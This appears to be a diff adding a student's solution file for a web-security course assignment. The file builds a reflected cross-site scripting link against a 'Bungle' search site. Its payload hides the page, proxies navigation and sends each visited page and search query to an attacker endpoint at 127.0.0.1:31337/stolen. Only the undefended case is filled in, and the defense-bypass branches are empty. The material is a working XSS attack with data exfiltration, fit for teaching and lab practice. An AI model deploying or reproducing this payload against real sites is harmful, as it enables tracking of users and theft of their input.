@@ -1,0 +1,102 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+// Extend this function:
+function payload(attacker) {
+	function log(data) {
+		console.log($.param(data))
+		$.get(attacker, data);
+	}
+	function proxy(href) {
+		$("html").load(href, function(){
+			$("html").show();
+			log({event: "nav", uri: href});
+			$("#query").val("pwned!");
+			$('#bungle-lnk').on("click", function(event) {
+				event.preventDefault();
+				proxy("http://permalink.co/");
+				alert("Bungle_button_alert");
+			});	
+
+
+			$('#search-again-btn').on("click", function(event) {
+				event.preventDefault();
+				proxy("http://permalink.co/");
+				alert("Search_Again_button_alert");
+			});		
+
+			$('form[action="./search"]').on("submit", function(event) {
+				usersSearch = document.getElementById('query').value;
+				event.preventDefault();
+				proxy("http://permalink.co/search?q=" + usersSearch);
+				alert("Search_form_alert");
+			});		
+
+		});
+	}
+	$("html").hide();
+	proxy("./");
+	
+
+}
+
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+	} else if(xssdefense == 1){
+	// Implement code to defeat XSS defenses here.
+		
+	}
+	else if(xssdefense == 2){
+
+	}
+	else if(xssdefense == 3){
+		
+	}
+	else{ //xssdefense == 4
+		
+	}
+}
+
+var xssdefense = 0;
+var target = "http://permalink.co/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+</script>
+<h3></h3>
+
+			<!--
+			//$('#search-btn').click(function(){  alert("xss"), log("data")  });
+			//form on submit  .pn is something else to look intout
+			
+			// $('#search-btn').on("click", function(event) {
+			// 	event.preventDefault();
+			// 	proxy("./search");
+			// 	alert("xss");
+			// });
+
+//push and pop states for back and forward buttons'
+		-->	
+
+
+			<!--
+			// $('#search-btn').on("click", function(event) {
+			// 	event.preventDefault();
+			// 	proxy("./search");
+			// 	alert("Search_button_alert");
+			-->
+<!--
+//
+//	forms
+//	$("tagyourareseachingfor[action = "formName"]")
+//	$("form[action = "formName"]")
+//
+//'form[action="./search"]'
+-->
